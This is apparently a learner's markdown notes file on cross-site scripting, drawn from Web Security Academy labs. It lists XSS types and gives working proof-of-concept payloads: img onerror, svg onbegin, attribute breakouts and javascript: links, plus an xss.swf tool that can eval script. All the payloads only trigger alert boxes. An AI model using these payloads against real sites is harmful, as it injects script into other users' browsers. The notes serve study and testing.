# XSS is the most known client side vulnerbility
## Types OF XSS
- Reflected XSS
- DOM Based XSS
- Stored XSS 
- Blind XSS

## There are client side frameworks can trigger xss in different methods
- [XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## Reflected XSS into HTML context with nothing encoded
```bash
https://0a88007603bad0a4808b0d0000230035.web-security-academy.net/?search=%3Cimg%20src=c%20onerror=%22alert(1)%22%20/.
```

### Stored XSS into HTML context with nothing encoded
```bash
in comment
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### DOM XSS in document.write sink using source
```bash
Website writes the userinput inside an image tag so
'ls" onload="alert(1)"'
this is enough
```

### DOM XSS in innerHTML sink using source location.search
```bash
input was reflecting inside a span tag
lola"><img%20src=x%20onerror="alert(1)"/>
```

### DOM XSS in jQuery anchor href attribute sink using location.search source
```bash
There was a controlable url parameter return path when i click back button 
it redirected me to that path
?redirect=/shop
i changed it to ?redirect=javascript:alert(1);
and back button <a href="javascript:alert(1)">
```

### Reflected XSS into attribute with angle brackets HTML-encoded
```bash
Reflected Inside Input Value Tag
"onmouseover="alert(1)
Solved
```

### XSS via swf file upload
```bash
git url : https://github.com/evilcos/xss.swf
location to url: xss.swf?a=location&c=http://www.google.com/
open url to new window: xss.swf?a=open&c=http://www.google.com/
http request to url: xss.swf?a=get&c=http://www.google.com/
eval js codz: xss.swf?a=eval&c=alert(document.domain)
```
